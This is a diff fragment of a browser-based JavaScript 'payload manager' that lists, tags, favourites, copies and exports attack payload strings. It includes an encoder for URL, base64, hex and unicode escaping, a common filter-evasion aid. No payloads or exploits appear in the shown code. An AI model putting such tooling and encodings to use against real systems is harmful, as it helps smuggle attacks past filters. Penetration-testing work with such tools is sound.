+      html += '<button class="fav-btn' + (isFav ? ' active' : '') + '" onclick="PM.toggleFav(\'' + p.id + '\')">' + (isFav ? '&#9733;' : '&#9734;') + '</button>';
+      html += '<span class="payload-text" onclick="PM.openModal(\'' + p.id + '\')">' + highlight(p.text, q) + '</span>';
+      html += '<div class="payload-meta">';
+      html += '<span class="payload-tag ' + tc + '">' + esc(p.tag) + '</span>';
+      html += '<span class="source-badge">' + esc(p.source) + '</span>';
+      html += '<button class="btn btn-copy btn-sm" onclick="PM.copyPayload(\'' + p.id + '\',this)">&#128203; COPY</button>';
+      html += '</div></div>';
+    }
+    list.innerHTML = html;
+  }
+
+  /* ── stats & tag pills ───────────────────────────────────────────── */
+  function updateStats() {
+    document.getElementById('stat-total').textContent = payloads.length;
+    document.getElementById('stat-favs').textContent = favs.size;
+    document.getElementById('stat-uploaded').textContent = payloads.filter(function(p){ return p.source==='uploaded'; }).length;
+    document.getElementById('stat-filtered').textContent = getFiltered().length;
+    buildTagsBar();
+  }
+
+  function buildTagsBar() {
+    var counts = {};
+    payloads.forEach(function(p){ counts[p.tag] = (counts[p.tag]||0)+1; });
+    var tagF = document.getElementById('tagFilter').value;
+    var html = '<span class="tag-pill' + (!showFavsOnly && tagF==='All' ? ' active' : '') + '" data-tag="All" onclick="PM.filterTag(\'All\')">All (' + payloads.length + ')</span>';
+    Object.entries(counts).sort(function(a,b){ return b[1]-a[1]; }).forEach(function(e) {
+      var active = (!showFavsOnly && tagF===e[0]) ? ' active' : '';
+      html += '<span class="tag-pill' + active + '" data-tag="' + esc(e[0]) + '" onclick="PM.filterTag(\'' + e[0].replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\')">' + esc(e[0]) + ' (' + e[1] + ')</span>';
+    });
+    html += '<span class="tag-pill' + (showFavsOnly ? ' active' : '') + '" data-tag="Favorites" onclick="PM.toggleFavFilter()">&#9733; Favs (' + favs.size + ')</span>';
+    document.getElementById('tagsBar').innerHTML = html;
+  }
+
+  function filterTag(tag) {
+    document.getElementById('tagFilter').value = (tag === 'All') ? 'All' : tag;
+    showFavsOnly = false;
+    document.getElementById('favToggle').textContent = '&#9734; Favorites';
+    render(); updateStats();
+  }
+
+  /* ── favorites ───────────────────────────────────────────────────── */
+  function saveFavs() {
+    localStorage.setItem('pm_favs', JSON.stringify(Array.from(favs)));
+  }
+
+  function toggleFav(id) {
+    if (favs.has(id)) favs.delete(id); else favs.add(id);
+    saveFavs(); render(); updateStats();
+  }
+
+  function toggleFavFilter() {
+    showFavsOnly = !showFavsOnly;
+    document.getElementById('favToggle').innerHTML = showFavsOnly ? '&#9733; All' : '&#9734; Favorites';
+    render(); updateStats();
+  }
+
+  function favAllVisible() {
+    getFiltered().forEach(function(p){ favs.add(p.id); });
+    saveFavs(); render(); updateStats();
+    showToast('Added all visible to favorites');
+  }
+
+  /* ── copy ────────────────────────────────────────────────────────── */
+  function copyPayload(id, btn) {
+    var p = null;
+    for (var i = 0; i < payloads.length; i++) { if (payloads[i].id === id) { p = payloads[i]; break; } }
+    if (!p) return;
+    navigator.clipboard.writeText(p.text).then(function() {
+      btn.innerHTML = '&#10003; COPIED';
+      btn.classList.add('copied');
+      setTimeout(function(){ btn.innerHTML='&#128203; COPY'; btn.classList.remove('copied'); }, 1500);
+      showToast('Copied to clipboard');
+    });
+  }
+
+  function copyAllVisible() {
+    var texts = getFiltered().map(function(p){ return p.text; }).join('\n');
+    navigator.clipboard.writeText(texts).then(function(){ showToast('Copied ' + getFiltered().length + ' payloads'); });
+  }
+
+  /* ── toast ───────────────────────────────────────────────────────── */
+  function showToast(msg) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(t._tmr);
+    t._tmr = setTimeout(function(){ t.classList.remove('show'); }, 2200);
+  }
+
+  /* ── modal ───────────────────────────────────────────────────────── */
+  function openModal(id) {
+    var p = null;
+    for (var i = 0; i < payloads.length; i++) { if (payloads[i].id === id) { p = payloads[i]; break; } }
+    if (!p) return;
+    currentModalId = id;
+    document.getElementById('modalTitle').textContent = p.tag + ' Payload';
+    document.getElementById('modalCode').textContent = p.text;
+    var tc = tagClass(p.tag);
+    document.getElementById('modalMeta').innerHTML =
+      '<span class="payload-tag ' + tc + '">' + esc(p.tag) + '</span>' +
+      '<span class="source-badge">' + esc(p.source) + '</span>' +
+      '<span style="font-size:10px;color:var(--text3);font-family:\'JetBrains Mono\',monospace">' + p.text.length + ' chars</span>';
+    document.getElementById('modalOverlay').classList.add('open');
+  }
+
+  function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
+
+  function overlayClick(e) { if (e.target === document.getElementById('modalOverlay')) closeModal(); }
+
+  function copyModalPayload() {
+    if (!currentModalId) return;
+    var p = null;
+    for (var i = 0; i < payloads.length; i++) { if (payloads[i].id === currentModalId) { p = payloads[i]; break; } }
+    if (!p) return;
+    navigator.clipboard.writeText(p.text).then(function(){ showToast('Copied to clipboard'); });
+  }
+
+  function sendToEncoder() {
+    if (!currentModalId) return;
+    var p = null;
+    for (var i = 0; i < payloads.length; i++) { if (payloads[i].id === currentModalId) { p = payloads[i]; break; } }
+    if (!p) return;
+    document.getElementById('encInput').value = p.text;
+    document.getElementById('encoderPanel').classList.add('open');
+    closeModal();
+    setTimeout(function(){ document.getElementById('encoderPanel').scrollIntoView({ behavior:'smooth' }); }, 100);
+  }
+
+  /* ── encoder ─────────────────────────────────────────────────────── */
+  function doEncode(type) {
+    var inp = document.getElementById('encInput').value;
+    var out = '';
+    try {
+      if (type === 'url')     out = encodeURIComponent(inp);
+      if (type === 'url2')    out = encodeURIComponent(encodeURIComponent(inp));
+      if (type === 'html')    out = inp.split('').map(function(c){ return '&#'+c.charCodeAt(0)+';'; }).join('');
+      if (type === 'base64')  out = btoa(unescape(encodeURIComponent(inp)));
+      if (type === 'hex')     out = inp.split('').map(function(c){ return '\\x'+c.charCodeAt(0).toString(16).padStart(2,'0'); }).join('');
+      if (type === 'unicode') out = inp.split('').map(function(c){ return '\\u'+c.charCodeAt(0).toString(16).padStart(4,'0'); }).join('');
+    } catch(e) { out = 'Error: ' + e.message; }
+    document.getElementById('encOutput').value = out;
+  }
+
+  function doDecode(type) {
+    var inp = document.getElementById('encInput').value;
+    var out = '';
+    try {
+      if (type === 'url')    out = decodeURIComponent(inp);
+      if (type === 'base64') out = decodeURIComponent(escape(atob(inp)));
+    } catch(e) { out = 'Decode error: ' + e.message; }
+    document.getElementById('encOutput').value = out;
+  }
+
+  function copyEncOutput() {
+    navigator.clipboard.writeText(document.getElementById('encOutput').value).then(function(){ showToast('Copied encoded output'); });
+  }
+
+  /* ── add manual ──────────────────────────────────────────────────── */
+  function addManual() {
+    var text = document.getElementById('newPayloadText').value.trim();
+    var tag  = document.getElementById('newPayloadTag').value;
+    if (!text) return;
+    payloads.push({ text: text, tag: tag, source: 'manual', id: uid() });
+    document.getElementById('newPayloadText').value = '';
+    showToast('Added ' + tag + ' payload');
+    render(); updateStats();
+  }
+
+  /* ── export ──────────────────────────────────────────────────────── */
+  function exportFavs() {
+    var data = payloads.filter(function(p){ return favs.has(p.id); }).map(function(p){ return p.text; }).join('\n');
+    if (!data) { showToast('No favorites to export'); return; }
+    dlFile('favorites.txt', data);
+  }
+
+  function exportAll() {
+    var data = getFiltered().map(function(p){ return p.text; }).join('\n');
+    dlFile('payloads-export.txt', data);
+  }
+
+  function dlFile(name, content) {
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(new Blob([content], { type: 'text/plain' }));
+    a.download = name; a.click();
+    showToast('Exported ' + name);
+  }
+
+  function clearUploaded() {
+    var before = payloads.length;
+    payloads = payloads.filter(function(p){ return p.source !== 'uploaded'; });
+    showToast('Removed ' + (before - payloads.length) + ' uploaded payloads');
+    render(); updateStats();
+  }
+
+  /* ── panel toggles ───────────────────────────────────────────────── */
+  function toggleEncoder() { document.getElementById('encoderPanel').classList.toggle('open'); }
+  function toggleAddForm()  { document.getElementById('addForm').classList.toggle('open'); }
+
+  /* ── keyboard ────────────────────────────────────────────────────── */
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeModal();
+    if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+      e.preventDefault();
+      document.getElementById('searchInput').focus();
+    }
+  });
+
+  /* ── init ────────────────────────────────────────────────────────── */
+  loadBuiltins();
+  render();
+  updateStats();
+
+  /* ── public API ──────────────────────────────────────────────────── */
+  return {
+    handleFile:handleFile, dragOver:dragOver, dragLeave:dragLeave, dropFile:dropFile,
+    render:render, filterTag:filterTag, updateStats:updateStats,
+    toggleFav:toggleFav, toggleFavFilter:toggleFavFilter, favAllVisible:favAllVisible,
+    copyPayload:copyPayload, copyAllVisible:copyAllVisible,
+    openModal:openModal, closeModal:closeModal, overlayClick:overlayClick,
+    copyModalPayload:copyModalPayload, sendToEncoder:sendToEncoder,
+    doEncode:doEncode, doDecode:doDecode, copyEncOutput:copyEncOutput,
+    addManual:addManual, exportFavs:exportFavs, exportAll:exportAll,
+    clearUploaded:clearUploaded, toggleEncoder:toggleEncoder, toggleAddForm:toggleAddForm
+  };
+})();
+</script>
+</body>
+</html>
